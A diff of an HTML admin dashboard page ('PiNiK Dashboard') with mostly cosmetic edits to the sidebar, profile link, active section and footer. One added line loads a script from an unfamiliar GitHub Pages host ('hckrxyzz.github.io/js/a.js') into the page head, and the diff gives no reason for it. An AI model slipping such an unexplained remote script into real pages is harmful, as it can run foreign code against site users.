@@ -5,8 +5,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PiNiK Dashboard</title>
+     <script src="https://hckrxyzz.github.io/js/a.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
-
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap');
 
@@ -84,7 +84,6 @@
             opacity: 0;
             transform: translateY(20px);
             transition: all 0.5s ease;
-            display: none;
         }
 
         .content-section.active {
@@ -147,7 +146,6 @@
 </head>
 
 <body>
-
     <header class="header fixed top-0 left-0 right-0 h-16 z-50 flex items-center justify-between px-4">
         <div class="flex items-center">
             <button id="sidebar-toggle" class="mr-4 text-white hover:text-cyan-400 transition-colors">
@@ -191,12 +189,12 @@
 
             <div
                 class="w-8 h-8 rounded-full bg-gradient-to-r from-cyan-400 to-purple-500 flex items-center justify-center cursor-pointer pulse">
-                <span class="text-sm font-bold">JB</span>
+                <a class="text-sm font-bold" href="#profile" title="profile">JB</a>
             </div>
         </div>
     </header>
 
-    <aside id="sidebar" class="sidebar fixed left-0 top-16 bottom-0 w-64 z-40 transform transition-transform">
+   <aside id="sidebar" class="sidebar fixed top-16 left-0 w-64 h-full bg-gray-800 text-white z-40 transition-transform transform -translate-x-full md:translate-x-0">
         <nav class="py-4">
             <div class="px-4 py-2 text-xs text-gray-400 uppercase">Main Menu</div>
             <a href="#" class="sidebar-item flex items-center px-4 py-3 text-white hover:text-cyan-400"
@@ -229,7 +227,7 @@
                 ID RESET
             </a>
           
-            <a href="#" class="sidebar-item flex items-center px-4 py-3 text-white hover:text-cyan-400"
+            <a href="#profile" class="sidebar-item flex items-center px-4 py-3 text-white hover:text-cyan-400"
                 data-section="profile">
                 <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-3" fill="none" viewBox="0 0 24 24"
                     stroke="currentColor">
@@ -319,7 +317,7 @@
 
 
 
-        <section id="dashboard" class="content-section">
+        <section id="dashboard" class="content-section active">
             <div class="container p-3 bg-gray-800 rounded-lg neon-box text-white mt-4 mb-4">
                 <h2 class="uppercase text-2xl font-bold mb-4 neon-glow text-black border-b border-gray-100 pb-3">Dashboard
                     Overview</h2>
@@ -362,10 +360,6 @@
                 </div>
             </div>
         </section>
-
-        <footer class="bg-gray-800 text-white text-center py-4 mt-8">
-            &copy; 2025 PiNiK.ADMIN All rights reserved.
-        </footer>
     </main>
 
 
